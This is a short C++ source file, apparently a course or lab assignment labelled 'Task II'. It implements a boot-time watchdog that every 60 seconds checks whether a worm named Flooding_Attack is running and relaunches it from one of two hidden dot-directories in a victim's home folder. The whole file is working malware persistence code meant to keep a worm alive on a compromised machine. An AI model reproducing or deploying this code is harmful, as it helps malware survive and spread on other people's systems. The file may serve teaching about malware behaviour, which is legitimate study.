/**
 * Task II
 *
 * This program should be executed whenever the computer is booted. It checks
 * whether the worm is running or not for every 60 seconds. This program itself
 * does not perform any payload.
 *
 * The first worm should be put at "/home/victim/.etc/.module/Flooding_Attack"
 * while another tentative put at
 * "/home/victim/.firefox/.module/Flooding_Attack"
 */

#include <signal.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <fstream>
#include <string>

#define MINUTE 60 * 1000 * 1000
#define LOCATION_A "/home/victim/.etc/.module/Flooding_Attack"
#define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"

std::string path_bin;
int pid = -1;

// Queries if the worm programming is running.
bool isWormRunning(int pid) { return kill(pid, 0) == 0; }

// Queries any location the worm binary is repalced. If no bin file exists,
// return empty string.
std::string isWormDistributed() {
    struct stat buffer;
    if (stat(LOCATION_A, &buffer) == 0) {
        return LOCATION_A;
    }
    if (stat(LOCATION_B, &buffer) == 0) {
        return LOCATION_B;
    }
    return "";
}

// Executes the worm placed at given location. Returns the pid of the executed
// worm.
int runWorm(std::string& loc) {
    pid_t pid = fork();
    if (pid == 0) {
        // Children
        char* args[] = {NULL};
        execv(loc.c_str(), args);
        exit(0);
    }
    return pid;
}

int main() {
    int pid = -1;
    while (1) {
        if (pid < 0 || !isWormRunning(pid)) {
            std::string path = isWormDistributed();
            if (path == "") return -1;
            pid = runWorm(path);
            if (pid < 0) return -1;
        }
        usleep(MINUTE);
    }
    return -1;  // should not end
}